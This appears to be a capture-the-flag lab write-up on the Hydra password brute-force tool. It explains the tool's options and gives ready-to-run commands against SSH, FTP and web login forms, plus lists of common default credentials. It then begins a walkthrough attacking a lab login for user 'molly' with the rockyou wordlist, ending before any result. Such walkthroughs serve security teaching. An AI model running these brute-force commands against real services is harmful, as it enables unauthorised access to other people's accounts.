<h1 align="center"> Hydra </h1>

<img width="1349" height="186" alt="image" src="https://github.com/user-attachments/assets/62d7c515-055d-4149-b62a-d14f0d9a703f" />



---


## Task 1

What is Hydra?

Hydra is a password brute-force tool.

A brute-force attack means:
- we already know a username
- We try many passwords automatically
- Hydra tests them very fast until one works

Instead of typing passwords manually:
````
admin : 123456
admin : password
admin : qwerty
admin : letmein
````
Hydra automates it:
````
hydra -l admin -P passwords.txt ssh://192.168.1.10
````
Meaning:
- ``-l admin`` → username = admin
- ``-P passwords.txt`` → use a password list file
- ``ssh://192.168.1.10`` → attack SSH service

Hydra will try:

admin : 123456
admin : password
admin : qwerty
...

until it finds:
````
[22][ssh] host:192.168.1.10 login:admin password:secret123
````
What services can Hydra test?
- SSH
- FTP
- HTTP login forms
- Telnet
- SMB
- RDP
- POP3
- IMAP
- MySQL
- VNC

Example:

- FTP attack
````
hydra -l admin -P rockyou.txt ftp://10.10.10.5
````
Web login form
````
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
````


Why does the screenshot mention admin:password?

Because many devices use weak default credentials:
````
admin:admin
admin:password
root:root
````
Examples:
- CCTV cameras
- Routers
- IoT devices

Attackers often try these first.

That’s why the page says:

> Strong passwords matter.

- Bad:
````
password123
admin123
qwerty
````

- Better:
````
R3d!Tiger#2026
````


---


## Using Hydra

### General Hydra structure
````
hydra [options] target service
````
Example:
````
hydra -l user -P passlist.txt ftp://10.49.146.169
````
Meaning:
- ``hydra`` → run Hydra
- ``-l user`` → single username
- ``-P passlist.txt`` → password list file
- ``ftp://`` → service to attack
- ``10.49.146.169`` → target IP

Hydra will try every password in the file for that user.


### SSH 
````
hydra -l root -P passwords.txt 10.49.146.169 -t 4 ssh
````
| Option | Meaning                     |
| ------ | --------------------------- |
| `-l`   | username                    |
| `-P`   | password list               |
| `-t`   | threads (parallel attempts) |


Explanation:
- ``root`` → login username
- ``passwords.txt`` → password file
- ``-t 4`` → try 4 passwords simultaneously
- ``ssh`` → target service


Hydra attacks:
````
root : password1
root : admin123
root : qwerty
...
````


#### Threads (-t)
````
-t 4
````
Means:

Hydra runs **4 attempts at once**.

Without threads:
````
Try one
Wait
Try next
Wait
````
With threads: ``Try 4 passwords simultaneously``

Faster brute forcing.


### POST Web Form section

This is for website login pages.
````
Username: admin
Password: test
````

Hydra needs:
- Login page path
- Form field names
- Failure message
````
hydra -l admin -P wordlist.txt 10.49.146.169 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
````

Breakdown

- ``http-post-form`` → website uses POST request
- ``/`` → login page path
`- ``username=^USER^``:

Hydra Replace:
````
^USER^ → admin
````

- Hydra replaces:
````
^USER^ → admin
````
``password=^PASS^``.


- Hydra Replace:
````
^PASS^ → each password from wordlist
````
`F=incorrect`.

Mean:

If server say:
````
incorrect
````
login failed.

Hydra uses that text to know wrong passwords.


- `-V`: Verbose mode:

Shows every attempt:
````
admin:123
admin:password
admin:qwerty
````

---



### Example flow
Hydra sends:
````
POST / HTTP/1.1

username=admin
password=123456
````

Server:
````
incorrect
````

Hydra tries next:
````
username=admin
password=password123
````
Until success.


### Important Note for Use Hydra with web:
Before using Hydra on websites:
- Open browser
- Press ``F12``
- Open Network tab
- Login once
- Find:
  - POST or GET
  - username field
  - password field
  - failure message

Then build the Hydra command.


---


## Question & Answer:

In this first we need to start our Machine.

After click on **Start Machine** we see this:
<img width="1244" height="166" alt="image" src="https://github.com/user-attachments/assets/3b922465-1de4-4863-88cc-969e95df42cd" />

Now my target IP is:
````
10.49.164.69
````
---

### 1. Use Hydra to brute-force molly's web password. What is the value of flag 1?
<img width="1216" height="100" alt="image" src="https://github.com/user-attachments/assets/21995559-2c0c-4876-848f-e1ec76537c76" />

Test connection target:
````
ping 10.49.164.69
````
<img width="784" height="347" alt="image" src="https://github.com/user-attachments/assets/cae079d2-634a-4703-b060-ea4238d8c2a6" />

- Scan target:
````
nmap -sS -sV 10.49.164.69
````
<img width="1148" height="322" alt="image" src="https://github.com/user-attachments/assets/d83c9e38-11d5-4001-a85e-3c243098e041" />

Type this to browser:
````
10.49.164.69
````
<img width="1189" height="933" alt="image" src="https://github.com/user-attachments/assets/458d25dd-987f-478a-ad47-82d579c5e648" />

Now we see login page.


Also in our lab we know only Username:
````
molly
````


After back to our hydra web:
- Press `F12` or `Right-Click` -> `Inspect`:
<img width="1857" height="826" alt="image" src="https://github.com/user-attachments/assets/b52b6846-4952-48c5-abbd-956973118633" />

<img width="1855" height="891" alt="image" src="https://github.com/user-attachments/assets/953bc055-f851-4f74-bbad-a4c6a8ae79ce" />

Now we see `GET Method`.

After test login:
````
Username: molly
Password: molly
````
<img width="1856" height="902" alt="image" src="https://github.com/user-attachments/assets/6fba31c2-7303-4e11-9ab0-41d72e9f4247" />

Now we see it incorrect username and password:
````
Your username or password is incorrect
````
<img width="1861" height="892" alt="image" src="https://github.com/user-attachments/assets/a1bbaff9-b5b0-47e7-aa80-10f42a2ffa6a" />


Now when i click Login it show this after click `All`:
<img width="1857" height="498" alt="image" src="https://github.com/user-attachments/assets/33bc4ecb-6d06-47d5-8499-506ea2c2bfce" />

<img width="1860" height="467" alt="image" src="https://github.com/user-attachments/assets/c91d7daf-a1e3-49e7-8a24-538dd813f854" />

<img width="1857" height="500" alt="image" src="https://github.com/user-attachments/assets/b1edd7a1-2ad0-4ea1-9c23-73214bb32bb4" />

Alos in this in `Post Request`.

Now we can scraft our command:
````
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.164.69 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect" -V
````
<img width="1908" height="265" alt="image" src="https://github.com/user-attachments/assets/aa6ff8a3-2a87-40e7-8f8b-3958e5964ac2" />

But now i nit yet have ``rockyou.txt`` wordlist, so I need to install:
````
sudo apt install wordlists
````
<img width="1109" height="483" alt="image" src="https://github.com/user-attachments/assets/ba3b3ba6-f48d-41e6-a85d-77c127a48321" />


````
ls /usr/share/wordlists/
````
<img width="1318" height="176" alt="image" src="https://github.com/user-attachments/assets/48e24a4b-3b0e-45aa-9c1f-6db27f53bf5f" />

Now we see `rockyou.txt.gz`.

- After Unzip it:
````
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
ls /usr/share/wordlists/
````
<img width="1302" height="245" alt="image" src="https://github.com/user-attachments/assets/65114449-6cb4-4662-a2f0-7649b10105db" />

Now we see `rockyou.txt`.


















